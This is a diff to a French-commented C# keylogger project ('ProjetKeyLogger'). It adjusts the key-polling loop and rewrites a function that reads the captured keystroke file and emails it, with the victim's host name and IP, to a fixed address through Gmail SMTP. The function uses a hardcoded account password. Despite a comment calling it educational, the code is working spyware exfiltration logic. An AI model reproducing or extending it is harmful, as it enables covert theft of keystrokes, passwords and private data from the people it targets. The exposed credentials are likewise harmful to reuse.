@@ -62,7 +62,7 @@ namespace ProjetKeyLogger
             {
                
                 //Comme on a une boucle infinie, il faut permettre aux autres fonctions de se déclencher et donc arreter la boucle temporairement
-                Thread.Sleep(5); //nombre en miliseconde
+                Thread.Sleep(3); //nombre en miliseconde
 
                 //verification de l'état de chaque touche (up ou down)
                                 
@@ -370,60 +370,61 @@ namespace ProjetKeyLogger
         {
 
             //recuperation du contenu du fichier
-            string Contenu = File.ReadAllText(file_path);
+            string contenu_fichier = File.ReadAllText(file_path);
 
             //date du mail
-            DateTime Date_Mail = DateTime.Now;
+            string date_mail = DateTime.Now.ToString();
+
             //l'object du mail
-            string Objet_Mail = "Capture keylogger";
+            string objet_mail = "Capture keylogger";
             //recuperation de l'adresse ip de l'ordinateur pour identifier notre victime
-            var Nom_Ordinateur = Dns.GetHostEntry(Dns.GetHostName());
+            var nom_ordinateur = Dns.GetHostEntry(Dns.GetHostName());
 
             //Création du corps du mail
             //Utiliser les autres fonctions de charlie 
-            string Corps_Mail = "date :" + Date_Mail + "\n Adresse ip de la victime :" + Nom_Ordinateur + "\n";
-            Corps_Mail += Contenu;
+            string corps_mail = "date : " + date_mail + "\n Adresse ip de la victime :" + nom_ordinateur + "\n";
+            corps_mail += contenu_fichier;
 
             //Envoie du mail avec le protocole SMTP (utilisation d'une adresse gmail dans ce cas mais on peut changer)
             //587=numero de port de gmail
-            SmtpClient Client = new SmtpClient("smtp.gmail.com", 587);
-            MailMessage Message_Mail = new MailMessage();
+            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
+            MailMessage message_mail = new MailMessage();
 
             //definition de l'adresse mail qui envoie
             //Cette adresse à été crée spécialement pour ce projet à but non lucratif et seulement éducatif.
-            Message_Mail.From = new MailAddress("camenenlythiery@gmail.com");
+            message_mail.From = new MailAddress("camenenlythiery@gmail.com");
 
             //definition de l'adresse de destination 
             //Création d'un mail temporaire. On peut aussi mettre notre adresse mail!
             //site de création du mail : temp-mail.org
-            Message_Mail.To.Add("ccamenen@outlook.fr");
+            message_mail.To.Add("ccamenen@outlook.fr");
 
             //defition de l'objet du mail
-            Message_Mail.Subject = Objet_Mail;
+            message_mail.Subject = objet_mail;
 
             //En true, elle utilise les identifiant de l'utilisateur actuel. En false, elle utilise les valeurs que nous lui donnons plus bas
-            Client.UseDefaultCredentials = false;
+            client.UseDefaultCredentials = false;
 
             //utilisation du protocole SSL (Secure sockets Layer) pour transporter de manière sécurisée
-            Client.EnableSsl = true;
+            client.EnableSsl = true;
 
             //UseDefaultCredentials étant déclaré en False, il faut lui fournier les inforamtions de connexion 
-            Client.Credentials = new System.Net.NetworkCredential("camenenlythiery@gmail.com", "projetc#2020");
+            client.Credentials = new System.Net.NetworkCredential("camenenlythiery@gmail.com", "projetc#2020");
 
             //définition du corps du mail
-            Message_Mail.Body = Corps_Mail;
+            message_mail.Body = corps_mail;
 
             //Ajout de la pièce jointe
-            System.Net.Mail.Attachment pieceJointe = new System.Net.Mail.Attachment(file_path);
+            System.Net.Mail.Attachment piece_jointe = new System.Net.Mail.Attachment(file_path);
             //On renomme le fichier pour pouvoir identifier notre victime
-            pieceJointe.Name = Dns.GetHostName() +"_" + Date_Mail + ".xml";
-            Message_Mail.Attachments.Add(pieceJointe);
+            piece_jointe.Name = Dns.GetHostName() +"_" + date_mail + ".xml";
+            message_mail.Attachments.Add(piece_jointe);
 
             //Envoie du message
-            Client.Send(Message_Mail);
+            client.Send(message_mail);
 
             // Libère les ressources utilisé par le fichier envoyé par mail. Cela supprime le flux et permet au programme de continuer, sans cela le programme plante.
-            Message_Mail.Dispose();
+            message_mail.Dispose();
         }
 
 
